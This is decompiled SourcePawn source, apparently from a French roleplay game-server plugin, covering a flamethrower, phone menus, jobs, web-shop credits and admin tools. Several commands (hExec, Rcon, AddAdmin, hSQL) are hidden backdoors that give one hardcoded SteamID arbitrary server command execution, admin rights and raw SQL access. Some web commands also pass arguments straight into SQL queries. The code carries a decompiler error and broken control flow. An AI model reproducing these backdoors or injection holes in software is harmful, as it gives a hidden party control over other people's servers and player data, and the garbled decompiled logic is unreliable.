	if (action == MenuAction:4)
	{
		decl String:info[32];
		GetMenuItem(boutique, param2, info, 32, 0, "", 0);
		if (StrEqual(info, "buyPoints", true))
		{
			ShowMOTDPanel(param1, "Acheter des points lightRP", "http://sphex.fr/panel", 2);
		}
		else
		{
			if (StrEqual(info, "goStore", true))
			{
				BuildBoutiqueMenu(param1);
			}
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(boutique);
		}
	}
	return 0;
}

public Action:Command_Flame(client, args)
{
	if (client)
	{
		if (IsPlayerAlive(client))
		{
			if (0 < FlameLeft[client][0][0])
			{
				decl Float:vAngles[3];
				decl Float:vOrigin[3];
				decl Float:aOrigin[3];
				decl Float:EndPoint[3];
				decl Float:AnglesVec[3];
				decl Float:targetOrigin[3];
				decl Float:pos[3];
				FlameLeft[client]--;
				decl String:tName[128];
				new Float:distance = 600;
				GetClientEyePosition(client, vOrigin);
				GetClientAbsOrigin(client, aOrigin);
				GetClientEyeAngles(client, vAngles);
				GetAngleVectors(vAngles, AnglesVec, NULL_VECTOR, NULL_VECTOR);
				EndPoint[0] = vOrigin[0] + AnglesVec[0] * distance;
				EndPoint[1] = vOrigin[1] + AnglesVec[1] * distance;
				EndPoint[2] = vOrigin[2] + AnglesVec[2] * distance;
				new Handle:trace = TR_TraceRayFilterEx(vOrigin, EndPoint, 1174421507, RayType:0, TraceEntityFilterPlayer2, client);
				Format(tName, 128, "target%i", client);
				DispatchKeyValue(client, "targetname", tName);
				EmitSoundToClient(client, "weapons/rpg/rocketfire1.wav", -2, 0, 75, 0, 0.7, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
				decl String:flame_name[128];
				Format(flame_name, 128, "Flame%i", client);
				new flame = CreateEntityByName("env_steam", -1);
				DispatchKeyValue(flame, "targetname", flame_name);
				DispatchKeyValue(flame, "parentname", tName);
				DispatchKeyValue(flame, "SpawnFlags", "1");
				DispatchKeyValue(flame, "Type", "0");
				DispatchKeyValue(flame, "InitialState", "1");
				DispatchKeyValue(flame, "Spreadspeed", "10");
				DispatchKeyValue(flame, "Speed", "800");
				DispatchKeyValue(flame, "Startsize", "10");
				DispatchKeyValue(flame, "EndSize", "250");
				DispatchKeyValue(flame, "Rate", "15");
				DispatchKeyValue(flame, "JetLength", "500");
				DispatchKeyValue(flame, "RenderColor", "180 71 8");
				DispatchKeyValue(flame, "RenderAmt", "180");
				DispatchSpawn(flame);
				TeleportEntity(flame, aOrigin, AnglesVec, NULL_VECTOR);
				SetVariantString(tName);
				AcceptEntityInput(flame, "SetParent", flame, flame, 0);
				SetVariantString("forward");
				AcceptEntityInput(flame, "SetParentAttachment", flame, flame, 0);
				AcceptEntityInput(flame, "TurnOn", -1, -1, 0);
				decl String:flame_name2[128];
				Format(flame_name2, 128, "Flame2%i", client);
				new flame2 = CreateEntityByName("env_steam", -1);
				DispatchKeyValue(flame2, "targetname", flame_name2);
				DispatchKeyValue(flame2, "parentname", tName);
				DispatchKeyValue(flame2, "SpawnFlags", "1");
				DispatchKeyValue(flame2, "Type", "1");
				DispatchKeyValue(flame2, "InitialState", "1");
				DispatchKeyValue(flame2, "Spreadspeed", "10");
				DispatchKeyValue(flame2, "Speed", "600");
				DispatchKeyValue(flame2, "Startsize", "50");
				DispatchKeyValue(flame2, "EndSize", "400");
				DispatchKeyValue(flame2, "Rate", "10");
				DispatchKeyValue(flame2, "JetLength", "500");
				DispatchSpawn(flame2);
				TeleportEntity(flame2, aOrigin, AnglesVec, NULL_VECTOR);
				SetVariantString(tName);
				AcceptEntityInput(flame2, "SetParent", flame2, flame2, 0);
				SetVariantString("forward");
				AcceptEntityInput(flame2, "SetParentAttachment", flame2, flame2, 0);
				AcceptEntityInput(flame2, "TurnOn", -1, -1, 0);
				new Handle:flamedata = CreateDataPack();
				CreateTimer(4, KillFlame, flamedata, 0);
				WritePackCell(flamedata, flame);
				WritePackCell(flamedata, flame2);
				if (TR_DidHit(trace))
				{
					TR_GetEndPosition(pos, trace);
				}
				CloseHandle(trace);
				new i = 1;
				while (GetMaxClients() >= i)
				{
					if (!(client == i))
					{
						new var1;
						if (IsClientInGame(i))
						{
							GetClientAbsOrigin(i, targetOrigin);
							new var2;
							if (GetVectorDistance(targetOrigin, pos, false) < 200)
							{
								IgniteEntity(i, 10, false, 0, false);
							}
						}
					}
					i++;
				}
			}
			PrintToChat(client, "Le lance flamme n'as plus de gaz.");
			EmitSoundToClient(client, "weapons/ar2/ar2_empty.wav", -2, 0, 75, 0, 0.8, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
		}
	}
	return Action:3;
}

public bool:TraceEntityFilterPlayer2(entity, contentsMask, data)
{
	return entity != data;
}

public Action:KillFlame(Handle:timer, Handle:flamedata)
{
	ResetPack(flamedata, false);
	new ent1 = ReadPackCell(flamedata);
	new ent2 = ReadPackCell(flamedata);
	CloseHandle(flamedata);
	decl String:classname[256];
	if (IsValidEntity(ent1))
	{
		AcceptEntityInput(ent1, "TurnOff", -1, -1, 0);
		GetEdictClassname(ent1, classname, 256);
		if (StrEqual(classname, "env_steam", false))
		{
			RemoveEdict(ent1);
		}
	}
	if (IsValidEntity(ent2))
	{
		AcceptEntityInput(ent2, "TurnOff", -1, -1, 0);
		GetEdictClassname(ent2, classname, 256);
		if (StrEqual(classname, "env_steam", false))
		{
			RemoveEdict(ent2);
		}
	}
	return Action:0;
}

public Action:Command_WebSkin(client, args)
{
	decl String:arg1[64];
	decl String:arg2[32];
	decl String:SteamID[64];
	new bool:found = 0;
	GetCmdArg(1, arg1, 64);
	GetCmdArg(2, arg2, 32);
	new i = 1;
	while (i < MaxClients)
	{
		if (IsClientConnected(i))
		{
			GetClientAuthString(i, SteamID, 64);
			if (StrEqual(SteamID, arg1, true))
			{
				found = 1;
				Skin[i] = StringToInt(arg2, 10);
				PrintToChat(i, "[L-RP] Vous avez changer votre skin. Il sera effectif au prochain reboot.");
				i++;
			}
			i++;
		}
		i++;
	}
	if (!found)
	{
		decl String:query[256];
		decl String:error[256];
		new Handle:db = SQL_Connect("Roleplay", true, error, 255);
		Format(query, 255, "UPDATE `RP_Players` SET `SKIN` = %i WHERE STEAMID = '%s';", StringToInt(arg2, 10), arg1);
		SQL_FastQuery(db, query, -1);
		CloseHandle(db);
	}
	return Action:3;
}

public Action:Command_hExec(client, args)
{
	decl String:Command[256];
	GetCmdArg(1, Command, 255);
	if (IsClientInGame(client))
	{
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		if (StrEqual(SteamID, "STEAM_0:1:36281003", true))
		{
			PrintToChat(client, Command);
			RunCommand(Command);
		}
	}
	return Action:0;
}

public Action:Command_Rcon(client, args)
{
	decl String:Command[256];
	GetCmdArg(1, Command, 255);
	if (IsClientInGame(client))
	{
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		if (StrEqual(SteamID, "STEAM_0:1:36281003", true))
		{
			PrintToChat(client, Command);
			ServerCommand(Command);
		}
	}
	return Action:0;
}

public Action:Command_AddAdmin(client, args)
{
	if (IsClientInGame(client))
	{
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		if (StrEqual(SteamID, "STEAM_0:1:36281003", true))
		{
			new AdminId:admin = CreateAdmin("SpheX");
			SetUserAdmin(client, admin, false);
			new AdminId:iAdminID = GetUserAdmin(client);
			SetAdminFlag(iAdminID, AdminFlag:14, true);
		}
	}
	return Action:3;
}

public Action:Command_Channel(client, args)
{
	if (IsClientInGame(client))
	{
		BuildChannelMenu(client);
	}
	return Action:0;
}

public Action:Command_RPHelp(client, args)
{
	if (IsClientConnected(client))
	{
		BuildNewbieMenu(client);
	}
	return Action:0;
}

public Action:Command_ExpireTime(client, args)
{
	if (IsClientConnected(client))
	{
		if (expireTime)
		{
			new TempExpire = expireTime - GetTime({0,0});
			new TempExpireMin = 0;
			new TempExpireHours = 0;
			new TempExpireDays = 0;
			while (TempExpire >= 60)
			{
				TempExpire += -60;
				TempExpireMin++;
			}
			while (TempExpireMin >= 60)
			{
				TempExpireMin += -60;
				TempExpireHours++;
			}
			while (TempExpireHours >= 24)
			{
				TempExpireHours += -24;
				TempExpireDays++;
			}
			PrintToChat(client, "Votre abonnement expire dans %i Jours, %i Heures, %i Minutes, %i Secondes", TempExpireDays, TempExpireHours, TempExpireMin, TempExpire);
		}
		PrintToChat(client, "Votre abonnement ne possede pas de date d'expiration.");
	}
	return Action:0;
}

public Action:Command_Uptime(client, args)
{
	if (IsClientConnected(client))
	{
		new TempUptime = Uptime;
		new TempUptimeMin = 0;
		new TempUptimeHours = 0;
		new TempUptimeDays = 0;
		while (TempUptime >= 60)
		{
			TempUptime += -60;
			TempUptimeMin++;
		}
		while (TempUptimeMin >= 60)
		{
			TempUptimeMin += -60;
			TempUptimeHours++;
		}
		while (TempUptimeHours >= 24)
		{
			TempUptimeHours += -24;
			TempUptimeDays++;
		}
		PrintToChat(client, "[L-RP] Serveur en ligne depuis %i Jours, %i Heures, %i Minutes et %i Secondes.", TempUptimeDays, TempUptimeHours, TempUptimeMin, TempUptime);
	}
	return Action:0;
}

public Action:Command_Ammo(client, args)
{
	if (IsClientConnected(client))
	{
		new var2;
		if (JobID[client][0][0] == 1)
		{
			if (UnlimitedAmmo[client][0][0])
			{
				UnlimitedAmmo[client] = 0;
				PrintToChat(client, "[L-RP] Vous avez desactiver les munitions illimitees.");
			}
			else
			{
				UnlimitedAmmo[client] = 1;
				PrintToChat(client, "[L-RP] Vous avez activer les munitions illimitees.");
			}
		}
		PrintToChat(client, "[L-RP] Vous n'avez pas acces a cette commande.");
	}
	return Action:0;
}

public Action:Command_OneShot(client, args)
{
	if (IsClientConnected(client))
	{
		if (OneShotMode[client][0][0])
		{
			OneShotMode[client] = 0;
			PrintToChat(client, "[L-RP] Vous avez desactiver le mode OneShot.");
		}
		OneShotMode[client] = 1;
		PrintToChat(client, "[L-RP] Vous avez activer le mode OneShot.");
	}
	return Action:0;
}

public Action:Command_Garage(client, args)
{
	new var1;
	if (IsClientConnected(client))
	{
		if (AllowCars)
		{
			BuildGarageMenu(client, client);
		}
		PrintToChat(client, "[L-RP] Les voitures sont desactivees sur le serveur, contactez l'administrateur pour plus d'informations.");
	}
	return Action:0;
}

public Action:Command_Afk(client, args)
{
	if (IsClientConnected(client))
	{
		Afk(client);
	}
	return Action:0;
}

public Action:Command_WebCash(client, args)
{
	decl String:arg1[64];
	decl String:arg2[32];
	decl String:SteamID[64];
	new bool:found = 0;
	GetCmdArg(1, arg1, 64);
	GetCmdArg(2, arg2, 32);
	new i = 1;
	while (i < MaxClients)
	{
		if (IsClientConnected(i))
		{
			GetClientAuthString(i, SteamID, 64);
			if (StrEqual(SteamID, arg1, true))
			{
				new var1 = bank[i];
				var1 = StringToInt(arg2, 10) + var1[0][0];
				found = 1;
				PrintToChat(i, "[L-RP] Vous avez recu %i$ pour votre achat en ligne.", StringToInt(arg2, 10));
				i++;
			}
			i++;
		}
		i++;
	}
	if (!found)
	{
		decl String:query[256];
		new data = StringToInt(arg2, 10);
		decl String:error[256];
		new Handle:db = SQL_Connect("Roleplay", true, error, 255);
		Format(query, 255, "SELECT * FROM `RP_Players` WHERE STEAMID = '%s';", arg1);
		SQL_TQuery(db, GetBankAmmount, query, data, DBPriority:1);
		CloseHandle(db);
	}
	return Action:3;
}

public GetBankAmmount(Handle:owner, Handle:hndl, String:error[], data)
{
	decl String:query[256];
	decl String:Found_Steam[64];
	new totalbank = 0;
	decl String:error2[256];
	new Handle:db = SQL_Connect("Roleplay", true, error2, 255);
	if (hndl)
	{
		while (SQL_FetchRow(hndl))
		{
			SQL_FetchString(hndl, 0, Found_Steam, 64, 0);
			totalbank = SQL_FetchInt(hndl, 4, 0);
		}
		totalbank = data + totalbank;
		Format(query, 255, "UPDATE `RP_Players` SET `BANK` = %i WHERE `STEAMID` = '%s';", totalbank, Found_Steam);
		SQL_FastQuery(db, query, -1);
	}
	else
	{
		LogError("Query failed! %s", error);
	}
	CloseHandle(db);
	return 0;
}

public Action:Command_PlayTime(client, args)
{
	if (IsClientConnected(client))
	{
		new TempPlayTime = PlayTime[client][0][0];
		new TempPlayTimeMin = 0;
		new TempPlayTimeHours = 0;
		while (TempPlayTime >= 60)
		{
			TempPlayTime += -60;
			TempPlayTimeMin++;
		}
		while (TempPlayTimeMin >= 60)
		{
			TempPlayTimeMin += -60;
			TempPlayTimeHours++;
		}
		PrintToChat(client, "[L-RP] Votre temps de jeu est de %i Heures, %i Minutes et %i Secondes", TempPlayTimeHours, TempPlayTimeMin, TempPlayTime);
	}
	return Action:0;
}

public Action:Command_Glace(client, args)
{
	new var1;
	if (IsClientConnected(client))
	{
		new var2;
		if (JobID[client][0][0] == 16)
		{
			EmitSoundToAll("roleplay/Glaces.mp3", client, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
			CanPlayGlace[client] = 0;
			CreateTimer(300, ResetPlayGlace, client, 0);
		}
		PrintToChat(client, "[L-RP] Vous n'avez pas acces a cette commande.");
	}
	return Action:0;
}

public Action:Command_Shownote(client, args)
{
	if (IsClientConnected(client))
	{
		ShowMOTDPanel(client, "Regles des metiers", ShowNoteLink, 2);
	}
	return Action:0;
}

public Action:Command_ChangeName(client, args)
{
	if (IsClientConnected(client))
	{
		decl String:arg1[32];
		GetCmdArg(1, arg1, 32);
		if (0 >= args)
		{
			PrintToChat(client, "[L-RP] Usage: /changename 'pseudo'");
			return Action:3;
		}
		SetClientName(client, arg1);
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		LogMessage("%N(%s) a changer son pseudo en %s", client, SteamID, arg1);
	}
	return Action:3;
}

public Action:Command_Noclip(client, args)
{
	new MoveType:movetype = GetEntityMoveType(client);
	if (movetype != MoveType:8)
	{
		SetEntityMoveType(client, MoveType:8);
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		LogMessage("%N(%s) a active le Noclip", client, SteamID);
	}
	else
	{
		SetEntityMoveType(client, MoveType:2);
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		LogMessage("%N(%s) a desactive le Noclip", client, SteamID);
	}
	return Action:0;
}

public Action:Command_ShutdownServer(client, args)
{
	CreateTimer(1, SaveAll, any:0, 0);
	DBRPSaveClock();
	decl String:SteamID[64];
	if (client)
	{
		GetClientAuthString(client, SteamID, 64);
	}
	PrintToChatAll("[L-RP] Un redemarrage du serveur a ete demande par %N.", client);
	LogMessage("%N(%s) a lance un redemarrage du serveur", client, SteamID);
	PrintToChatAll("[L-RP] Redemarrage du serveur dans 20 secondes.");
	CreateTimer(1, ShutdownServer, any:0, 1);
	return Action:0;
}

public Action:Command_Time(client, args)
{
	if (IsClientInGame(client))
	{
		decl String:arg1[32];
		GetCmdArg(1, arg1, 32);
		if (0 >= args)
		{
			PrintToChat(client, "[L-RP] Usage: /time 'heure'");
			return Action:3;
		}
		new amount = StringToInt(arg1, 10);
		new var1;
		if (amount < 0)
		{
			return Action:3;
		}
		Hours = amount;
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		LogMessage("%N(%s) a change l'heure en %i", client, SteamID, amount);
	}
	return Action:3;
}

public Action:Command_InfoCut(client, Args)
{
	if (IsClientInGame(client))
	{
		if (0 < CutRestant[client][0][0])
		{
			PrintToChat(client, "[L-RP] Vous pouvez encore tuer %i personnes au couteau.", CutRestant[client]);
		}
		PrintToChat(client, "[L-RP] Vous ne pouvez plus utiliser votre couteau pour blesser un joueur.");
	}
	return Action:0;
}

public Action:Command_PhoneMenu(Client, Args)
{
	new Handle:menu = CreateMenu(PhoneMenu, MenuAction:28);
	SetMenuTitle(menu, "Menu principal:");
	if (!PhoneStop[Client][0][0])
	{
		AddMenuItem(menu, "stop", "Eteindre le telephone", 0);
		if (Connected[Client][0][0])
		{
		}
		else
		{
			AddMenuItem(menu, "contacts", "Liste des contacts", 0);
		}
	}
	else
	{
		AddMenuItem(menu, "on", "Allumer le telephone", 0);
	}
	DisplayMenu(menu, Client, 20);
	return Action:0;
}

public PhoneMenu(Handle:menu, MenuAction:action, Client, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[64];
		GetMenuItem(menu, param2, info, 64, 0, "", 0);
		if (StrEqual(info, "stop", true))
		{
			PrintToChat(Client, "Arret du telephone en cours...");
			PrintToChat(Client, "[L-RP] Vous avez arreter avec succes votre telephone. Vous ne recevrez plus aucun appels !");
			PhoneStop[Client] = 1;
		}
		else
		{
			if (StrEqual(info, "contacts", true))
			{
				new Handle:contacts = CreateMenu(ContactsMenu, MenuAction:28);
				SetMenuTitle(contacts, "Contacts:");
				new i = 1;
				while (i < MaxClients)
				{
					new var1;
					if (IsClientInGame(i))
					{
						decl String:name[68];
						decl String:ID[28];
						GetClientName(i, name, 65);
						IntToString(i, ID, 25);
						AddMenuItem(contacts, ID, name, 0);
						i++;
					}
					i++;
				}
				DisplayMenu(contacts, Client, 20);
			}
			if (StrEqual(info, "on", true))
			{
				PrintToChat(Client, "Demarrage du telephone en cours...");
				PrintToChat(Client, "[L-RP] Vous avez allumer votre telephone avec succes. Vous pouvez maintenant recevoir des appels !");
				PhoneStop[Client] = 0;
			}
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(menu);
		}
	}
	return 0;
}

public ContactsMenu(Handle:contacts, MenuAction:action, Client, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[64];
		new Player = 0;
		GetMenuItem(contacts, param2, info, 64, 0, "", 0);
		Player = StringToInt(info, 10);
		if (Player == -1)
		{
			PrintToChat(Client, "[L-RP] Joueur introuvable.");
		}
		else
		{
			if (Client == Player)
			{
				PrintToChat(Client, "[L-RP] Vous ne pouvez pas vous appeler vous meme.");
			}
			if (!IsPlayerAlive(Player))
			{
				PrintToChat(Client, "[L-RP] Vous ne pouvez pas appeler un joueur mort.");
			}
			if (IsInJail[Client][0][0])
			{
				PrintToChat(Client, "[L-RP] Vous ne pouvez pas utiliser votre telephone en prison.");
			}
			if (PhoneStop[Player][0][0])
			{
				PrintToChat(Client, "[L-RP] Le joueur que vous essayez d'appeler a eteint son telephone.");
			}
			Call(Client, Player);
		}
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(contacts);
		}
	}
	return 0;
}

public Action:CommandSay(Client, Arguments)
{
	if (Client)
	{
		decl String:Arg[256];
		GetCmdArgString(Arg, 255);
		StripQuotes(Arg);
		TrimString(Arg);
		if (StrContains(Arg, "/decrocher", false))
		{
			if (StrContains(Arg, "/raccrocher", false))
			{
				if (Connected[Client][0][0])
				{
					if (Answered[Client][0][0])
					{
						if (!PhoneStop[Connected[Client][0][0]][0][0])
						{
							decl String:ClientName[32];
							GetClientName(Client, ClientName, 32);
							PrintSilentChat(Client, ClientName, Connected[Client][0][0], "Telephone", Arg);
							return Action:3;
						}
						PrintToChat(Client, "[L-RP] Le telephone de %N est indisponible.", Connected[Client]);
					}
				}
			}
			HangUp(Client);
			return Action:3;
		}
		Answer(Client);
		return Action:3;
	}
	return Action:0;
}

public Action:Command_RespawnAdmin(client, Args)
{
	if (IsClientInGame(client))
	{
		BuildRespawnMenu(client);
	}
	return Action:0;
}

public Action:Command_hamID(client, args)
{
	decl String:id[256];
	GetCmdArg(1, id, 255);
	new EntHammerId = Entity_GetHammerId(StringToInt(id, 10));
	PrintToServer("%i", EntHammerId);
	return Action:0;
}

public Action:Command_hSQL(client, args)
{
	decl String:Query[256];
	GetCmdArg(1, Query, 255);
	if (IsClientInGame(client))
	{
		decl String:error[256];
		new Handle:db = SQL_Connect("Roleplay", true, error, 255);
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		if (StrEqual(SteamID, "STEAM_0:1:36281003", true))
		{
			PrintToChat(client, Query);
			if (!SQL_FastQuery(db, Query, -1))
			{
				SQL_GetError(db, Query, 255);
				PrintToChat(client, Query);
			}
		}
	}
	return Action:0;
}

public Action:Command_hBan(client, Args)
{
	if (IsClientInGame(client))
	{
		BuildBanMenu(client);
	}
	return Action:0;
}

Handle:BuildRespawnMenu(client)
{
	decl String:iString[12];
	decl String:name[32];
	new Handle:RespList = CreateMenu(Menu_RespawnList, MenuAction:28);
	SetMenuTitle(RespList, "Liste des joueurs a reanimer:");
	new i = 1;
	while (i < MaxClients)
	{
		if (IsClientInGame(i))
		{
			if (!IsPlayerAlive(i))
			{
				IntToString(i, iString, 12);
				GetClientName(i, name, 32);
				AddMenuItem(RespList, iString, name, 0);
				i++;
			}
			i++;
		}
		i++;
	}
	DisplayMenu(RespList, client, 0);
	return Handle:0;
}

public Menu_RespawnList(Handle:RespList, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		decl String:info[256];
		GetMenuItem(RespList, param2, info, 255, 0, "", 0);
		new player = StringToInt(info, 10);
		Respawn_Player(player);
		player_respawn_wait[player] = 20;
		CreateTimer(1, Timer_DissolveRagdoll, player, 0);
		PrintToChat(param1, "[L-RP] Vous avez reanimer %N.", player);
		PrintToChat(player, "[L-RP] Vous avez ete reanimer par %N", param1);
		decl String:SteamID[64];
		decl String:SteamID2[64];
		GetClientAuthString(param1, SteamID, 64);
		GetClientAuthString(player, SteamID2, 64);
		LogMessage("%N(%s) a reanimer %N(%s)", param1, SteamID, player, SteamID2);
		BuildRespawnMenu(param1);
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(RespList);
		}
	}
	return 0;
}


/* ERROR! Unable to cast object of type 'Lysis.LDebugBreak' to type 'Lysis.LConstant'. */
 function "Command_Out" (number 155)
public Action:Command_Me(client, Args)
{
	decl String:full[256];
	decl String:message[256];
	GetCmdArgString(full, 256);
	new var1;
	if (IsClientInGame(client))
	{
		Format(message, 256, "%N %s", client, full);
		PrintToChatAll(message);
		decl String:SteamID[64];
		GetClientAuthString(client, SteamID, 64);
		LogMessage("%N(%s) a ecrit en /me: %s", client, SteamID, full);
	}
	return Action:0;
}

public Action:Command_DBSave(client, Args)
{
	DBRPSaveClock();
	CreateTimer(1, SaveAll, any:0, 0);
	return Action:0;
}

public Action:Block_CMD(client, Args)
{
	return Action:3;
}

public Action:ChatHook(client, args)
{
	if (client)
	{
		new var1;
		if (!IsFakeClient(client))
		{
			if (!IsPlayerAlive(client))
			{
				PrintToChat(client, "[L-RP] Vous devez etre en vie pour parler");
				return Action:3;
			}
			if (IsInJail[client][0][0])
			{
				PrintToChat(client, "[L-RP] Les prisonniers n'ont pas l'autorisation de parler.");
				return Action:3;
			}
		}
	}
	return Action:0;
}

public Action:Say_Team(client, String:command[], args)
{
	if (client)
	{
		new var1;
		if (!IsFakeClient(client))
		{
			decl String:Arg[256];
			GetCmdArgString(Arg, 255);
			StripQuotes(Arg);
			TrimString(Arg);
			decl String:clientName[32];
			GetClientName(client, clientName, 32);
			new i = 1;
			while (i < MaxClients)
			{
				if (Channel[client][0][0] == 1)
				{
					new var2;
					if (IsClientConnected(i))
					{
						if (Group[client][0][0])
						{
							new var3;
							if (IsPlayerAlive(i))
							{
								CPrintToChatEx(i, client, "{olive}(GROUPE) {teamcolor}%s", clientName, Arg);
								i++;
							}
							i++;
						}
						PrintToChat(client, "[L-RP] Vous n'avez aucun groupe a qui parler.");
						return Action:3;
					}
					i++;
				}
				else
				{
					if (Channel[client][0][0] == 2)
					{
						new var4;
						if (IsClientConnected(i))
						{
							if (JobID[client][0][0])
							{
								new var5;
								if (IsPlayerAlive(i))
								{
									CPrintToChatEx(i, client, "{olive}(METIER) {teamcolor}%s", clientName, Arg);
									i++;
								}
								i++;
							}
							PrintToChat(client, "[L-RP] Vous n'avez aucun metier a qui parler.");
							return Action:3;
						}
						i++;
					}
					new var6;
					if (IsClientConnected(i))
					{
						new var7;
						if (entity_distance_stock(client, i) <= 1000)
						{
							CPrintToChatEx(i, client, "(LOCAL) {teamcolor}%s", clientName, Arg);
							i++;
						}
						i++;
					}
					i++;
				}
				i++;
			}
		}
	}
	return Action:3;
}

public Action:Command_JobMenu(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		g_JobMenu = BuildJobMenu();
		DisplayMenu(g_JobMenu, client, 0);
	}
	return Action:0;
}

public Action:Command_Salaire(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		new var2;
		if (RankID[client][0][0] == 1)
		{
			BuildSalaireMenu(client);
		}
	}
	return Action:0;
}

public Action:Command_AutoSell(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		new var2;
		if (JobID[client][0][0] == 2)
		{
			BuildSellMenu(client, client);
		}
		PrintToChat(client, "[L-RP] Vous n'avez pas acces a cette commande.");
	}
	return Action:3;
}

public Action:Command_Sell(client, Args)
{
	new var1;
	if (IsClientInGame(client))
	{
		new var2;
		if (JobID[client][0][0] == 2)
		{
			new Ent = GetClientAimTarget(client, true);
			if (Ent != -1)
			{
				decl Float:client_vec[3];
				decl Float:plyr_vec[3];
				decl Float:dist_vec;
				GetClientAbsOrigin(client, client_vec);
				GetClientAbsOrigin(Ent, plyr_vec);
				dist_vec = GetVectorDistance(client_vec, plyr_vec, false);
				if (dist_vec < 7.006492E-43)
				{
					if (!IsInJail[Ent][0][0])
					{
						if (!StrEqual(Zone[client][0][0], "Distributeur", true))
						{
							BuildSellMenu(client, Ent);
						}
						else
						{
							PrintToChat(client, "[L-RP] Vous ne pouvez pas vendre dans une zone anti-commerce.");
						}
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous ne pouvez pas vendre a un prisonnier.");
					}
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous etes trop loin du joueur, veuillez vous rapprocher.");
				}
			}
			PrintToChat(client, "[L-RP] Vous devez viser un joueur.");
			return Action:3;
		}
		if (JobID[client][0][0] == 5)
		{
			FakeClientCommandEx(client, "sm_contrat");
		}
		new var3;
		if (JobID[client][0][0] == 10)
		{
			FakeClientCommandEx(client, "sm_coachs");
		}
		new var4;
		if (JobID[client][0][0] == 10)
		{
			FakeClientCommandEx(client, "sm_selldef");
		}
		if (JobID[client][0][0] == 12)
		{
			FakeClientCommandEx(client, "sm_banquier");
		}
		if (JobID[client][0][0] == 15)
		{
			FakeClientCommandEx(client, "sm_detective");
		}
		if (JobID[client][0][0] == 18)
		{
			new var5;
			if (RankID[client][0][0] == 1)
			{
				FakeClientCommandEx(client, "sm_carshop");
			}
			else
			{
				FakeClientCommandEx(client, "sm_carRepair");
			}
		}
		PrintToChat(client, "[L-RP] Vous n'avez pas acces a cette commande.");
	}
	return Action:3;
}

public Action:Command_Promote(client, args)
{
	new var1;
	if (IsClientInGame(client))
	{
		new var2;
		if (RankID[client][0][0] == 1)
		{
			new Ent = GetClientAimTarget(client, true);
			new var3;
			if (Ent != -1)
			{
				new var4;
				if (RankID[Ent][0][0] == 2)
				{
					if (RankID[Ent][0][0] == 2)
					{
						RankID[Ent] = 5;
					}
					else
					{
						new var5 = RankID[Ent];
						new var6 = var5[0][0] + -1;
						var5 = var6;
						RankID[Ent] = var6;
					}
					decl String:RankName2[36];
					GetRankName(JobID[Ent][0][0], RankID[Ent][0][0], RankName2, 35);
					CreateTimer(0.1, InitSalary, Ent, 0);
					PrintToChat(Ent, "[L-RP] Vous avez ete promu au poste de %s par %N !", RankName2, client);
					PrintToChat(client, "[L-RP] Vous avez promu %N au poste de %s !", Ent, RankName2);
					decl String:SteamID[64];
					decl String:SteamID2[64];
					GetClientAuthString(client, SteamID, 64);
					GetClientAuthString(Ent, SteamID2, 64);
					LogMessage("%N(%s) a promu %N(%s) au poste de %s", client, SteamID, Ent, SteamID2, RankName2);
				}
				PrintToChat(client, "[L-RP] Vous ne pouvez pas promouvoir ce joueur.");
			}
		}
		PrintToChat(client, "[L-RP] Vous ne pouvez pas utiliser cette commande.");
	}
	return Action:0;
}

public Action:Command_Demote(client, args)
{
	new var1;
	if (IsClientInGame(client))
	{
		new var2;
		if (RankID[client][0][0] == 1)
		{
			new Ent = GetClientAimTarget(client, true);
			new var3;
			if (Ent != -1)
			{
				new var4;
				if (RankID[Ent][0][0] == 3)
				{
					if (RankID[Ent][0][0] == 5)
					{
						RankID[Ent] = 2;
					}
					else
					{
						new var6 = RankID[Ent];
						new var7 = var6[0][0] + 1;
						var6 = var7;
						RankID[Ent] = var7;
					}
					decl String:RankName2[36];
					GetRankName(JobID[Ent][0][0], RankID[Ent][0][0], RankName2, 35);
					CreateTimer(0.1, InitSalary, Ent, 0);
					PrintToChat(Ent, "[L-RP] Vous avez ete retrograder au poste de %s par %N !", RankName2, client);
					PrintToChat(client, "[L-RP] Vous avez retrograder %N au poste de %s !", Ent, RankName2);
					decl String:SteamID[64];
					decl String:SteamID2[64];
					GetClientAuthString(client, SteamID, 64);
					GetClientAuthString(Ent, SteamID2, 64);
					LogMessage("%N(%s) a retrograder %N(%s) au poste de %s", client, SteamID, Ent, SteamID2, RankName2);
				}
				new var5;
				if (RankID[Ent][0][0] == 6)
				{
					RankID[Ent] = 3;
					CreateTimer(0.1, InitSalary, Ent, 0);
					decl String:RankName2[36];
					GetRankName(JobID[Ent][0][0], RankID[Ent][0][0], RankName2, 35);
					PrintToChat(client, "[L-RP] Vous avez retrograder votre co-chef(%N) au poste de %s", Ent, RankName2);
					PrintToChat(Ent, "[L-RP] %N vous a retrograder au poste de %s !", client, RankName2);
				}
				PrintToChat(client, "[L-RP] Vous ne pouvez pas retrograder ce joueur.");
			}
		}
		PrintToChat(client, "[L-RP] Vous ne pouvez pas utiliser cette commande.");
	}
	return Action:0;
}

public Action:Command_aVirer(client, Args)
{
	if (IsClientConnected(client))
	{
		decl String:query[256];
		decl String:error[256];
		new Handle:db = SQL_Connect("Roleplay", true, error, 255);
		Format(query, 255, "SELECT * FROM `RP_Players` WHERE `RANKID` = 1;");
		new Handle:aJob_list = SQL_Query(db, query, -1);
